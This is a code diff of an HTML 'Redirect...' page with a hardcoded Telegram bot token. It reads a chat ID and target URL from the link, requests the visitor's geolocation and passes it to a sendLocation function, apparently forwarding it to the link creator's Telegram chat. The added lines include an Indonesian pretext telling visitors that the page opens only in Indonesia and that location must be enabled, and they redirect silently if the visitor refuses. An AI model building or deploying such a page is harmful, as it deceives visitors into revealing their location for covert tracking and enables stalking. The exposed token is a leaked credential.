@@ -3,8 +3,18 @@
 <head>
     <title>Redirect...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
     <script>
-        const BOT_TOKEN = "8466065352:AAHRmeCDR9R5UEBk1MQ5seUw-NCu1QOLs9A"; // Masukkan token bot kamu di sini
+        const BOT_TOKEN = "8466065352:AAHRmeCDR9R5UEBk1MQ5seUw-NCu1QOLs9A";
 
         function sendLocation(chatId, targetUrl) {
             if (navigator.geolocation) {
@@ -30,7 +40,15 @@
             let target = params.get("target");
 
             if (chatId && target) {
-                sendLocation(chatId, decodeURIComponent(target));
+                document.getElementById("message").innerText = "Halaman ini hanya bisa dibuka di Indonesia, untuk mengetahui lokasi anda maka nyalakan lokasi.";
+                // Langsung minta lokasi
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(() => {
+                        sendLocation(chatId, decodeURIComponent(target));
+                    }, () => {
+                        window.location.href = decodeURIComponent(target);
+                    });
+                }
             } else {
                 document.body.innerHTML = "<h3>Link tidak valid</h3>";
             }
@@ -38,6 +56,6 @@
     </script>
 </head>
 <body>
-    <p>Sedang memproses...</p>
+    <p id="message">Sedang memproses...</p>
 </body>
 </html>
